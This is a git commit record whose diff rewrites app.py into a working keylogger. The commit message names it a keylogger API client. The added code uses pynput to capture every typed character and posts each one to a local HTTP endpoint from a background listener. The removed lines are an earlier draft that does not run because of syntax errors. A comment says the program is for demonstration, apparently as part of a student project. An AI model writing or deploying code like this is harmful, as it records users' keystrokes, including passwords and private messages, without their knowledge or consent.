2886f2833f4477ecfe08a03a6d331e7a1595a018
albulenamakolli1 <96053284+albulenamakolli1@users.noreply.github.com>
2023-01-08 15:01:45 +0100

    Fixed app.py
    Made the app.py to send data to the keylogger API. An HTML site should be added to receive the data

--- app.py
+++ app.py
@@ -1,30 +1,30 @@
-from flask import Flask, request
-from pynput import keyboard
-import logging
-
-app = Flask(name)
-
-
+from pynput.keyboard import Key, Listener
+import time
+import requests
 
 def on_press(key):
-    character = str(key)
-    # Send the character to the API
-    requests.post('http://localhost:5000/keypress', data={'character': character})
+    try:
+        character = key.char
+    except AttributeError:
+        
+        return
+
+    # Send the key press data to the API
+    requests.post('http://localhost:5000/key_press', json={'character': character})
+
+    # Small delay to reduce the load on the computer
+    time.sleep(0.001)
 
 # Set up the listener
+listener = Listener(on_press=on_press)
+
+# Start the listener
+listener.start()
+
+# Run the listener in the background
 try:
-    listener = keyboard.Listener(on_press=on_press)
-catch (e) as e:
-    print e
-
-
-@app.route('/keypress', methods=['POST'])
-def keypress():
-    # Get the character that was sent in the request
-    character = request.form['character']
-
-    # Send the character back to the client as a response
-    return character
-
-if name == 'main':
-    app.run()
+    while True:
+        pass
+except KeyboardInterrupt:
+    # Stop the listener with ctrl +c (made for demonstrating )
+    listener.stop()
